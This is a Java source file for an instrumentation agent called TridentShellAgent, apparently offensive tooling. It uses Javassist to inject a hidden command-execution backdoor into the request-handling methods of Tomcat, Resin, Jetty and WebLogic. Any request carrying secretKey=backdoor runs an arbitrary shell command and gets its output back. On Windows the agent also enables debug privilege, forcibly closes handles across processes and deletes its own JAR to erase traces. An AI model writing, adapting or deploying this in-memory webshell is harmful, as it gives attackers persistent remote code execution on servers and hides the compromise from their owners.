package com.da_uit.agent;

import javassist.*;
import java.lang.instrument.*;
import java.security.ProtectionDomain;
import java.util.logging.Logger;
import com.sun.jna.platform.win32.*;
import com.sun.jna.platform.win32.WinNT.HANDLE;
import com.sun.jna.platform.win32.WinNT.HANDLEByReference;
import com.sun.jna.platform.win32.Tlhelp32.PROCESSENTRY32;
import com.sun.jna.ptr.IntByReference;
import java.io.File;
import java.net.URLDecoder;

public class TridentShellAgent {
    private static final Logger LOGGER = Logger.getLogger(TridentShellAgent.class.getName());
    private static final String AGENT_JAR_NAME = "TridentShellAgent-1.0-SNAPSHOT-jar-with-dependencies.jar";

    public static void premain(String agentArgs, Instrumentation inst) {
        LOGGER.info("Agent loaded successfully");
        inst.addTransformer(new MyTransformer());

        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            cleanupAgentJar();
        }
    }

    private static void cleanupAgentJar() {
        try {
            enableDebugPrivilege();

            String jarPath = getAgentJarPath();
            if (jarPath != null) {
                releaseFileHandle(jarPath);

                File jarFile = new File(jarPath);
                if (jarFile.exists() && jarFile.delete()) {
                    LOGGER.info("Successfully deleted agent JAR: " + jarPath);
                } else {
                    LOGGER.warning("Failed to delete agent JAR: " + jarPath);
                }
            }
        } catch (Exception e) {
            LOGGER.severe("Error during cleanup: " + e.getMessage());
        }
    }

    private static void enableDebugPrivilege() {
        HANDLEByReference token = new HANDLEByReference();
        try {
            // Open the current process token
            if (!Advapi32.INSTANCE.OpenProcessToken(Kernel32.INSTANCE.GetCurrentProcess(),
                    WinNT.TOKEN_ADJUST_PRIVILEGES | WinNT.TOKEN_QUERY, token)) {
                throw new RuntimeException("Failed to open process token: " + Kernel32.INSTANCE.GetLastError());
            }

            // Lookup the debug privilege LUID
            WinNT.LUID luid = new WinNT.LUID();
            if (!Advapi32.INSTANCE.LookupPrivilegeValue(null, WinNT.SE_DEBUG_NAME, luid)) {
                throw new RuntimeException("Failed to lookup debug privilege: " + Kernel32.INSTANCE.GetLastError());
            }

            // Enable the debug privilege
            WinNT.TOKEN_PRIVILEGES tp = new WinNT.TOKEN_PRIVILEGES(1);
            tp.Privileges[0] = new WinNT.LUID_AND_ATTRIBUTES(luid, new WinDef.DWORD(WinNT.SE_PRIVILEGE_ENABLED));
            if (!Advapi32.INSTANCE.AdjustTokenPrivileges(token.getValue(), false, tp, 0, null, null)) {
                throw new RuntimeException("Failed to enable debug privilege: " + Kernel32.INSTANCE.GetLastError());
            }
        } finally {
            if (token.getValue() != null) {
                Kernel32.INSTANCE.CloseHandle(token.getValue());
            }
        }
        LOGGER.info("Debug privilege enabled successfully");
    }

    private static String getAgentJarPath() throws Exception {
        String path = TridentShellAgent.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
        path = URLDecoder.decode(path, "UTF-8");
        if (!path.endsWith(AGENT_JAR_NAME)) {
            LOGGER.warning("Could not determine agent JAR path: " + path);
            return null;
        }
        return path;
    }

    private static void releaseFileHandle(String filePath) {
        HANDLE snapshot = Kernel32.INSTANCE.CreateToolhelp32Snapshot(Tlhelp32.TH32CS_SNAPPROCESS, new WinDef.DWORD(0));
        if (snapshot == WinBase.INVALID_HANDLE_VALUE) {
            LOGGER.severe("Failed to create process snapshot: " + Kernel32.INSTANCE.GetLastError());
            return;
        }

        try {
            PROCESSENTRY32 pe32 = new PROCESSENTRY32();
            if (!Kernel32.INSTANCE.Process32First(snapshot, pe32)) {
                LOGGER.severe("Failed to get first process: " + Kernel32.INSTANCE.GetLastError());
                return;
            }

            do {
                HANDLEByReference processHandle = new HANDLEByReference();
                HANDLE process = Kernel32.INSTANCE.OpenProcess(
                        WinNT.PROCESS_DUP_HANDLE | WinNT.PROCESS_QUERY_INFORMATION | WinNT.PROCESS_TERMINATE,
                        false, pe32.th32ProcessID.intValue());
                if (process == null) continue;

                try {

                    HANDLEByReference handleRef = new HANDLEByReference();
                    IntByReference handleCount = new IntByReference();

                    if (Kernel32.INSTANCE.DuplicateHandle(
                            process, WinBase.INVALID_HANDLE_VALUE, Kernel32.INSTANCE.GetCurrentProcess(),
                            handleRef, 0, false, 0x00000001)) { // DUPLICATE_CLOSE_SOURCE
                        Kernel32.INSTANCE.CloseHandle(handleRef.getValue());
                        LOGGER.info("Released handle for process ID: " + pe32.th32ProcessID.intValue());
                    }
                } finally {
                    Kernel32.INSTANCE.CloseHandle(process);
                }
            } while (Kernel32.INSTANCE.Process32Next(snapshot, pe32));
        } finally {
            Kernel32.INSTANCE.CloseHandle(snapshot);
        }
    }

    private static class MyTransformer implements ClassFileTransformer {

        @Override
        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
                                ProtectionDomain protectionDomain, byte[] classfileBuffer) {
            String[] targetClasses = {
                "org/apache/catalina/core/ApplicationFilterChain",
                "com/caucho/server/dispatch/ServletInvocation",
                "org/eclipse/jetty/server/handler/HandlerWrapper",
                "weblogic/wsee/server/servlet/BaseWSServlet"
            };

            for (String target : targetClasses) {
                if (className != null && className.equals(target)) {
                    LOGGER.info("Transforming class: " + className);
                    try {
                        ClassPool pool = ClassPool.getDefault();
                        pool.insertClassPath(new LoaderClassPath(loader));
                        CtClass ctClass = pool.makeClass(new java.io.ByteArrayInputStream(classfileBuffer));

                        String methodName;
                        if (className.equals("org/apache/catalina/core/ApplicationFilterChain")) {
                            methodName = "internalDoFilter";
                        } else if (className.equals("com/caucho/server/dispatch/ServletInvocation")) {
                            methodName = "service";
                        } else if (className.equals("org/eclipse/jetty/server/handler/HandlerWrapper")) {
                            methodName = "handle";
                        } else if (className.equals("weblogic/wsee/server/servlet/BaseWSServlet")) {
                            methodName = "service";
                        } else {
                            continue;
                        }

                        CtMethod targetMethod = ctClass.getDeclaredMethod(methodName);
                        String backdoorCode = 
                            "if ($1 != null && \"backdoor\".equals($1.getParameter(\"secretKey\"))) { " +
                            "    java.util.logging.Logger.getLogger(\"TridentShellAgent\").info(\"Backdoor activated with cmd: \" + $1.getParameter(\"cmd\")); " +
                            "    String cmd = $1.getParameter(\"cmd\"); " +
                            "    if (cmd != null && !cmd.isEmpty()) { " +
                            "        try { " +
                            "            String os = System.getProperty(\"os.name\").toLowerCase(); " +
                            "            java.lang.ProcessBuilder pb; " +
                            "            if (os.contains(\"win\")) { " +
                            "                pb = new java.lang.ProcessBuilder(\"cmd.exe\", \"/c\", cmd); " +
                            "            } else { " +
                            "                pb = new java.lang.ProcessBuilder(\"/bin/sh\", \"-c\", cmd); " +
                            "            } " +
                            "            java.util.logging.Logger.getLogger(\"TridentShellAgent\").info(\"Executing command: \" + String.join(\" \", pb.command())); " +
                            "            java.lang.Process p = pb.start(); " +
                            "            java.io.BufferedReader stdInput = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())); " +
                            "            java.io.BufferedReader stdError = new java.io.BufferedReader(new java.io.InputStreamReader(p.getErrorStream())); " +
                            "            StringBuilder output = new StringBuilder(); " +
                            "            String line; " +
                            "            while ((line = stdInput.readLine()) != null) { output.append(line).append(\"\\n\"); } " +
                            "            while ((line = stdError.readLine()) != null) { output.append(\"ERROR: \").append(line).append(\"\\n\"); } " +
                            "            p.waitFor(); " +
                            "            $2.setContentType(\"text/plain\"); " +
                            "            $2.getWriter().print(output.toString()); " +
                            "        } catch (Exception e) { " +
                            "            $2.sendError(500, \"Error executing command: \" + e.getMessage()); " +
                            "        } " +
                            "    } else { " +
                            "        $2.sendError(400, \"Missing cmd parameter\"); " +
                            "    } " +
                            "    return; " +
                            "} ";
                        targetMethod.insertBefore(backdoorCode);

                        byte[] modifiedClassFile = ctClass.toBytecode();
                        ctClass.detach();
                        LOGGER.info("Successfully transformed class: " + className);
                        return modifiedClassFile;
                    } catch (Exception e) {
                        LOGGER.severe("Error transforming class " + className + ": " + e.getMessage());
                        e.printStackTrace(System.err);
                    }
                }
            }
            return classfileBuffer;
        }
    }
}